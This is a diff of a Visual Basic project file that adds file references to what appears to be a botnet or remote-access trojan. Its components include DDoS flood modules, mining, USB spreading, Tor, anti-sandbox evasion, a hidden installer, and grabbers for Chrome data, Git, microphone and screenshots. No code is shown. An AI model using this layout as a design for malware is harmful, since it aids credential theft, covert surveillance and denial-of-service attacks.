@@ -91,6 +91,7 @@
       <Private>True</Private>
       <Private>True</Private>
     </Reference>
+    <Reference Include="System.Management" />
     <Reference Include="System.Windows.Forms" />
     <Reference Include="System.Xml" />
     <Reference Include="System.Core" />
@@ -133,8 +134,11 @@
       <SubType>Form</SubType>
     </Compile>
     <Compile Include="Interfaces\ICommand.vb" />
+    <Compile Include="Models\AdsModel.vb" />
     <Compile Include="Models\BaseCommands.vb" />
     <Compile Include="Models\BotDeatilsModel.vb" />
+    <Compile Include="Models\CMDModel.vb" />
+    <Compile Include="Models\EditHostFileModel.vb" />
     <Compile Include="Models\FloodModel\ArmeModel.vb" />
     <Compile Include="Models\FloodModel\BaseFloodModel.vb" />
     <Compile Include="Models\FloodModel\HttpBandWidthModel.vb" />
@@ -156,6 +160,7 @@
     <Compile Include="Models\MessageModel.vb" />
     <Compile Include="Models\MiningModel.vb" />
     <Compile Include="Models\ProcessModel.vb" />
+    <Compile Include="Models\SeedTorrentModel.vb" />
     <Compile Include="Models\WebsiteModel.vb" />
     <Compile Include="Class\Floods\Floods\3. Layer\ICMP.vb" />
     <Compile Include="Class\Floods\Floods\4. Layer\TCP.vb" />
@@ -168,11 +173,15 @@
     <Compile Include="Models\Json\IpInfoModel.vb" />
     <Compile Include="Class\Commands\ExecuteCommand.vb" />
     <Compile Include="Class\Commands\OpenWebsiteCommand.vb" />
+    <Compile Include="Moduls\Anti\AntiSandbox.vb" />
     <Compile Include="Moduls\Converter\FileSize.vb" />
     <Compile Include="Moduls\Converter\HashKey.vb" />
     <Compile Include="Moduls\Converter\TimeConverter.vb" />
     <Compile Include="Moduls\Details\ComputerDetails.vb" />
     <Compile Include="Moduls\Details\Details.vb" />
+    <Compile Include="Moduls\Grabs\Chrome.vb" />
+    <Compile Include="Moduls\Grabs\GitGrab.vb" />
+    <Compile Include="Moduls\Grabs\Hook.vb" />
     <Compile Include="Moduls\Grabs\ImageGrab.vb" />
     <Compile Include="Moduls\Grabs\MicroPhoneGrab.vb" />
     <Compile Include="Moduls\Grabs\TakeScreenShot.vb" />
@@ -180,8 +189,11 @@
     <Compile Include="Moduls\Installers\Installing.vb" />
     <Compile Include="Moduls\IO\UnZIPModule.vb" />
     <Compile Include="Moduls\Network\ResponseHTTP.vb" />
+    <Compile Include="Moduls\Network\Torrent.vb" />
+    <Compile Include="Moduls\Network\WebFilters.vb" />
     <Compile Include="Moduls\Search\ImageSearch.vb" />
     <Compile Include="Moduls\Spreads\USBSpread.vb" />
+    <Compile Include="Moduls\SQL\SQLiteHandler.vb" />
     <Compile Include="Moduls\Tor\ConfigTor.vb" />
     <Compile Include="Moduls\IO\GetPathes.vb" />
     <Compile Include="Moduls\Installers\HidderModule.vb" />
